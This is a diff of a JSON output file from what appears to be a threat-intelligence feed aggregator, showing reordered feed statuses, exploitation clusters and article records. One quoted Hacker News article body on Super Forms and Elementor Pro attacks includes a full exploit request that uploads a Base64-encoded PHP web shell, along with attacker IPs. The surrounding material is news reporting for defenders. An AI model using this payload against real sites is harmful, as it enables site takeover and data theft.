@@ -1,8 +1,8 @@
 {
-  "generated_at": "2026-09-06T10:42:17.066705+00:00",
+  "generated_at": "2026-09-06T14:04:22.017861+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
-  "total_items": 2248,
+  "total_items": 2238,
   "feed_status": {
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
@@ -25,19 +25,19 @@
       "item_count": 10,
       "in_window_count": 5
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
@@ -59,6 +59,13 @@
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 3
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -88,6 +95,20 @@
       "item_count": 10,
       "in_window_count": 9
     },
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 7
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 3
+    },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
       "cohort": "threat_research_primary",
@@ -102,54 +123,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
-    },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 2
-    },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 7
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 3
-    },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
-      "in_window_count": 0
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 23
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -165,18 +144,32 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 23
+    },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Black Hills Information Security": {
       "url": "https://www.blackhillsinfosec.com/feed/",
       "cohort": "detection_response_operations",
       "status": "parse_error",
       "item_count": 0,
-      "in_window_count": 0
-    },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 15,
       "in_window_count": 0
     },
     "The DFIR Report": {
@@ -186,19 +179,26 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
+    },
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 0
+    },
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -214,13 +214,6 @@
       "item_count": 15,
       "in_window_count": 2
     },
-    "Datadog Security Labs": {
-      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 1
-    },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
       "cohort": "detection_response_operations",
@@ -228,12 +221,19 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Datadog Security Labs": {
+      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 1
+    },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
       "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
@@ -249,13 +249,6 @@
       "item_count": 20,
       "in_window_count": 7
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Rapid7": {
       "url": "https://www.rapid7.com/blog/rss/",
       "cohort": "offensive_vulnerability_research",
@@ -268,14 +261,14 @@
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 3
+      "in_window_count": 2
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 0
+      "in_window_count": 1
     },
     "Sysdig": {
       "url": "https://sysdig.com/feed/",
@@ -291,12 +284,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Wiz Research": {
-      "url": "https://www.wiz.io/feed/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 2
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Cloudflare Security": {
       "url": "https://blog.cloudflare.com/tag/security/rss/",
@@ -304,6 +297,20 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Wiz Research": {
+      "url": "https://www.wiz.io/feed/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 2
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
@@ -317,13 +324,6 @@
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "parse_error",
       "item_count": 0,
-      "in_window_count": 0
-    },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
       "in_window_count": 0
     },
     "OpenSSF Blog": {
@@ -354,19 +354,19 @@
       "item_count": 5,
       "in_window_count": 5
     },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
-    },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 17
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
@@ -382,6 +382,13 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
       "cohort": "ai_security_agentic_risk",
@@ -389,19 +396,12 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 19
-    },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 50,
+      "in_window_count": 24
     },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
@@ -410,12 +410,12 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 24
+      "item_count": 30,
+      "in_window_count": 19
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -431,19 +431,19 @@
       "item_count": 100,
       "in_window_count": 100
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
+    },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
@@ -458,13 +458,6 @@
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
     },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
@@ -494,12 +487,26 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Reddit r/AskNetsec": {
       "url": "https://www.reddit.com/r/AskNetsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -514,13 +521,6 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 18
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
@@ -686,26 +686,22 @@
       "theme_key": "wordpress",
       "dominant_features": {
         "threat_categories": [
-          "active_exploitation",
-          "zero_day"
+          "active_exploitation"
         ],
         "affected_industries": [
           "government"
         ],
         "affected_products": [
-          "WordPress",
-          "OpenAI/ChatGPT"
+          "WordPress"
         ],
         "urgency_signals": [
           "preauth_unauth",
-          "actively_exploited",
-          "zero_day",
-          "no_patch_yet"
+          "actively_exploited"
         ]
       },
       "cluster_count": 5,
       "article_count": 6,
-      "cohesion": 0.201,
+      "cohesion": 0.221,
       "shared_strong_signals": [
         "WordPress"
       ],
@@ -715,15 +711,15 @@
         "d5d207ddf7",
         "6a5c697136",
         "64d5865aac",
-        "fb5d93339a",
+        "9ebfca707c",
         "d19603372e"
       ],
       "links": [
         "https://www.exploit-db.com/exploits/52668",
         "https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/",
         "https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/",
-        "https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/",
         "https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html",
+        "https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/",
         "https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency"
       ]
     },
@@ -895,9 +891,9 @@
       ]
     },
     {
-      "label": "CVE-2026-85046 exploitation activity",
-      "anchor_signal": "CVE-2026-85046",
-      "theme_key": "cve-2026-85046",
+      "label": "CVE-2026-3909 exploitation activity",
+      "anchor_signal": "CVE-2026-3909",
+      "theme_key": "cve-2026-3909",
       "dominant_features": {
         "threat_categories": [
           "zero_day",
@@ -918,7 +914,7 @@
       "article_count": 4,
       "cohesion": 0.533,
       "shared_strong_signals": [
-        "CVE-2026-85046"
+        "CVE-2026-3909"
       ],
       "member_cves": [],
       "also_targets": [],
@@ -971,44 +967,6 @@
       ]
     },
     {
-      "label": "CVE-2026-3909 exploitation activity",
-      "anchor_signal": "CVE-2026-3909",
-      "theme_key": "cve-2026-3909",
-      "dominant_features": {
-        "threat_categories": [
-          "zero_day",
-          "active_exploitation"
-        ],
-        "cve_ids": [
-          "CVE-2026-2441",
-          "CVE-2026-3909",
-          "CVE-2026-3910",
-          "CVE-2026-85046"
-        ],
-        "urgency_signals": [
-          "actively_exploited",
-          "zero_day"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 4,
-      "cohesion": 0.533,
-      "shared_strong_signals": [
-        "CVE-2026-3909"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "5ff343317a",
-        "64d5865aac"
-      ],
-      "links": [
-        "https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/",
-        "https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html",
-        "https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/"
-      ]
-    },
-    {
       "label": "CVE-2026-3910 exploitation activity",
       "anchor_signal": "CVE-2026-3910",
       "theme_key": "cve-2026-3910",
@@ -1033,6 +991,44 @@
       "cohesion": 0.533,
       "shared_strong_signals": [
         "CVE-2026-3910"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "5ff343317a",
+        "64d5865aac"
+      ],
+      "links": [
+        "https://www.helpnetsecurity.com/2026/09/04/google-chrome-zero-day-cve-2026-85046/",
+        "https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html",
+        "https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/"
+      ]
+    },
+    {
+      "label": "CVE-2026-85046 exploitation activity",
+      "anchor_signal": "CVE-2026-85046",
+      "theme_key": "cve-2026-85046",
+      "dominant_features": {
+        "threat_categories": [
+          "zero_day",
+          "active_exploitation"
+        ],
+        "cve_ids": [
+          "CVE-2026-2441",
+          "CVE-2026-3909",
+          "CVE-2026-3910",
+          "CVE-2026-85046"
+        ],
+        "urgency_signals": [
+          "actively_exploited",
+          "zero_day"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 4,
+      "cohesion": 0.533,
+      "shared_strong_signals": [
+        "CVE-2026-85046"
       ],
       "member_cves": [],
       "also_targets": [],
@@ -1302,9 +1298,9 @@
           "GitHub"
         ],
         "prior_top_industries": [
-          "critical_infrastructure",
-          "financial_services",
-          "government"
+          "education",
+          "government",
+          "healthcare"
         ],
         "prior_top_products": [
           "GitLab",
@@ -1346,15 +1342,15 @@
       },
       {
         "axis": "actor_attribution",
-        "value": "Cl0p",
-        "cluster_id": "498d32f5a8",
+        "value": "LockBit",
+        "cluster_id": "439827e1a6",
         "weeks_observed": 8
       },
       {
         "axis": "actor_attribution",
-        "value": "LockBit",
-        "cluster_id": "439827e1a6",
-        "weeks_observed": 8
+        "value": "Cl0p",
+        "cluster_id": "498d32f5a8",
+        "weeks_observed": 7
       },
       {
         "axis": "actor_attribution",
@@ -1523,7 +1519,7 @@
           "products": []
         }
       },
-      "score": 8
+      "score": 7
     },
     {
       "source": "The Hacker News",
@@ -1714,42 +1710,28 @@
       "author": "Ionut Arghire",
       "in_window": true,
       "taxonomy": {
-        "threat_categories": [
-          "zero_day"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure"
-        ],
+        "affected_industries": [],
         "affected_products": [
-          "WordPress",
-          "VMware",
-          "OpenAI/ChatGPT"
+          "WordPress"
         ],
         "tools_used": [],
         "cve_ids": [
           "CVE-2026-32475"
         ],
         "attack_techniques": [],
-        "urgency_signals": [
-          "zero_day",
-          "preauth_unauth",
-          "no_patch_yet"
-        ],
+        "urgency_signals": [],
         "content_type": "vulnerability_disclosure",
         "confidence_tier": "tier_4_news",
         "role_map": {
-          "WordPress": "target",
-          "VMware": "target",
-          "OpenAI/ChatGPT": "target"
+          "WordPress": "target"
         },
         "weak_tags": {
           "products": []
         }
       },
-      "score": 11,
-      "full_body": "Hackers have been exploiting a critical-severity vulnerability in the Elementor Pro WordPress plugin to hack websites, WordPress security firm Defiant warns. A highly popular drag-and-drop website builder, Elementor is a free WordPress plugin with over 10 million installations. Elementor Pro is the paid version that offers additional features, including a Form widget with support for File Upload fields. The bug, tracked as CVE-2026-32475 (CVSS score of 9.8), is described as an arbitrary file upload issue in the function that handles form submissions. While submissions are passed through the plugin’s validation and processing mechanisms, when the validation loop encounters an upload slot marked as empty, it triggers an error and returns, aborting the validation of other files in the field. The normal behavior would be to continue, skipping the empty entry, but the vulnerability results in checks never being applied to the remaining files uploaded through the same form field. An attacker can submit an upload field as an array with two parts: an empty slot that triggers the return, followed by a PHP payload that is uploaded without validation. Advertisement. Scroll to continue reading. Because the function that handles field processing correctly skips the empty slot and processes the second, unvalidated part of the field, the attacker-supplied file is written to disk. “As a result, an unauthenticated attacker can request the uploaded file to execute their PHP payload on the server,” Defiant explains , noting that this could lead to full site compromise. CVE-2026-32475 impacts all Elementor Pro plugin versions up to 4.2.1 and was patched in version 4.2.2 on August 19. Site owners should update to the fixed iteration as soon as possible. According to Defiant, threat actors started exploiting the security defect immediately after the fixes landed. The security firm has blocked over 190,000 exploit attempts to date. Successful exploitation of the vulnerability results in a PHP file being written to the /wp-content/uploads/elementor/forms/ directory, which stores uploaded form submissions. Site administrators are advised to check the directory for the presence of any PHP file, which is a strong indicator of compromise (IoC). They should also check logs for requests to /wp-admin/admin-ajax.php and check their sites for backdoors if any evidence of compromise is discovered. Defiant notes that Elementor Pro has over 6 million active installations, but it is unclear how many of them are affected. According to WordPress data , approximately two-thirds of Elementor’s 10 million installations run a vulnerable plugin version as of September 4. Related: 12-Year-Old PostgreSQL Vulnerability Enables Database, Server Takeover Related: VMware Workstation and Fusion Updates Patch Critical Vulnerability Related: Google Patches 6th Chrome Zero-Day of 2026 Related: Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal HiddenLayer Raises $100 Million for AI Runtime Security 153 Million Driver License Images Offered on Dark Web Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities Exploit Published for Fresh Cleo Harmony Vulnerability Malicious Virtualizor Update Served via BGP Hijacking Chrome and Firefox Updates Patch Dozens of Vulnerabilities Latest News In Other News: Microsoft’s Cloud Patches, Hacked Dropbox Accounts, Guardio’s $1.1B Valuation HPE Patches Critical RCE Vulnerabilities in AOS-CX OpenAI Pledges $1 Billion to Bring Frontier AI to Critical Infrastructure Defenders Sangoma Switchvox Vuln",
-      "fetch_status": "ok"
+      "score": 10
     },
     {
       "source": "BleepingComputer",
@@ -1781,7 +1763,7 @@
           "products": []
         }
       },
-      "score": 5
+      "score": 4
     },
     {
       "source": "The Hacker News",
@@ -3981,7 +3963,9 @@
       "author": "info@thehackernews.com (The Hacker News)",
       "in_window": true,
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "web_shell_backdoor"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [
@@ -3989,7 +3973,8 @@
         ],
         "tools_used": [],
         "cve_ids": [
-          "CVE-2026-14894"
+          "CVE-2026-14894",
+          "CVE-2026-32475"
         ],
         "attack_techniques": [],
         "urgency_signals": [
@@ -4004,7 +3989,9 @@
           "products": []
         }
       },
-      "score": 11
+      "score": 11,
+      "full_body": "Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws  Ravie Lakshmanan  Sep 04, 2026 Vulnerability / Web Security Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 6.3.314) CVE-2026-32475 (CVSS score: 9.0/9.8) - A vulnerability in Elementor Pro that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 4.2.2) As with arbitrary file upload vulnerabilities of this kind, an attacker can leverage them to write a PHP web shell to the site and execute arbitrary code, which can then be abused to create administrator accounts, exfiltrate data, or seize control of the entire WordPress site. It's worth noting that details about CVE-2026-32475 were disclosed by Patchstack last month. Successful exploitation requires the target site to have at least one published Elementor page containing a Form widget with a File Upload field. In a pair of reports published this week, Wordfence said it has already blocked over 250,000 and 190,000 exploit attempts targeting CVE-2026-14894 and CVE-2026-32475, respectively. Exploitation Against CVE-2026-14894 In the attacks exploiting CVE-2026-14894, threat actors have been found to issue an HTTP POST request to \"/wp-admin/admin-ajax.php\" using the \"super_submit_form\" endpoint containing a file field with a Base64-encoded PHP payload and an attacker-controlled file name as below - action=super_submit_form&form_id=2&sf_nonce=04c3aa2046&data={\"sf_upload_field\": {\"type\": \"files\", \"files\": [{\"datauristring\": \"data:image/gif;base64,PD9waHAgaWYoaXNzZXQoJF9GSUxFU1siZmlsZSJdKSl7JHRhcmdldD1iYXNlbmFtZSgkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSk7aWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwkdGFyZ2V0KSl7ZWNobyLinIUgVXBsb2FkZWQ6IDxhIGhyZWY9JyR0YXJnZXQnPiR0YXJnZXQ8L2E+Ijt9ZWxzZXtlY2hvIuKdjCBVcGxvYWQgZmFpbGVkISI7fWV4aXQ7fT8+PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPk11c2hyMDB3IFVwbG9hZGVyPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7aGVpZ2h0OjEwMHZoO21hcmdpbjowOyI+PGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBzdHlsZT0iYmFja2dyb3VuZDojMTExO3BhZGRpbmc6NDBweDtib3JkZXI6MnB4IHNvbGlkICMwMGZmMDA7Ym9yZGVyLXJhZGl1czoxMHB4O3RleHQtYWxpZ246Y2VudGVyOyI+PGgyPvCfk6QgVVBMT0FEPC9oMj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgcmVxdWlyZWQgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2JvcmRlcjoxcHggc29saWQgIzAwZmYwMDtwYWRkaW5nOjEwcHg7Ym9yZGVyLXJhZGl1czo1cHg7Ij48YnI+PGJyPjxidXR0b24gdHlwZT0ic3VibWl0IiBzdHlsZT0iYmFja2dyb3VuZDojMDBmZjAwO2NvbG9yOiMwYTBhMGE7cGFkZGluZzoxMHB4IDMwcHg7Ym9yZGVyOm5vbmU7Ym9yZGVyLXJhZGl1czo1cHg7Zm9udC13ZWlnaHQ6Ym9sZDtjdXJzb3I6cG9pbnRlcjsiPuKshiBVcGxvYWQ8L2J1dHRvbj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=\", \"value\": \"Mushr00w_upl.php\", \"name\": \"Mushr00w_upl.php\", \"label\": \"attachment\"}]}} The uploaded file, while prefixed with the \"data:image/gif;base64\" content type, is a PHP file-uploader web shell (\"Mushr00w_upl.php\"), which then acts as a conduit to upload additional payloads to the site. Attacks weaponizing the Super Forms plugin have originated from the following IP addresses - 103.168.147.235 103.168.146.131 103.154.152.178 103.170.97.7 182.10.130.51 189.4.122.140 129.227.46.143 64.176.209.104 103.164.182.122 37.9.33.62 The malicious activity is said to have begun on July 14, 2026, before scaling a peak of more than 40,000 exploit requests on August 18, 2026. Exploitation Against CVE-2026-32475 \"The attacker submits the form's File Up",
+      "fetch_status": "ok"
     },
     {
       "source": "Help Net Security",
@@ -6748,38 +6735,6 @@
         }
       },
       "score": 4
-    },
-    {
-      "source": "Orca Security Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Bring Orca Security Context Into the AWS Console with the Orca Browser Extension",
-      "link": "https://orca.security/resources/blog/orca-security-browser-extension-aws-console/",
-      "published": "2026-09-02T14:11:59+00:00",
-      "summary": "Key Takeaways The Cost of Switching Tabs Cloud engineers and developers live in the AWS console, not in a security platform. So when a question comes up about a resource’s risk, the only path has been to stop, open a new tab, and go looking for that asset inside their security tooling. That detour costs […]",
-      "author": "Jake Kramber",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "AWS"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {
-          "AWS": "target"
-        },
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 7
     },
     {
       "source": "The Hacker News",
@@ -9551,6 +9506,33 @@
       "score": 2
     },
     {
+      "source": "Huntress",
+      "cohort": "detection_response_operations",
+      "category": "detection_response_operations",
+      "title": "Boardroom Battles 2026: ASD’s Cyber Priorities & AI Risk",
+      "link": "https://www.huntress.com/blog/australian-signals-directorate-cyber-priorities",
+      "published": "2026-08-30T13:00:00+00:00",
+      "summary": "The Australian Signals Directorate’s 2026 board priorities and frontier AI guidance show why speed alone won’t stop AI-era cyber threats.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "SANS Internet Storm Center",
       "cohort": "government_authoritative",
       "category": "government_authoritative",
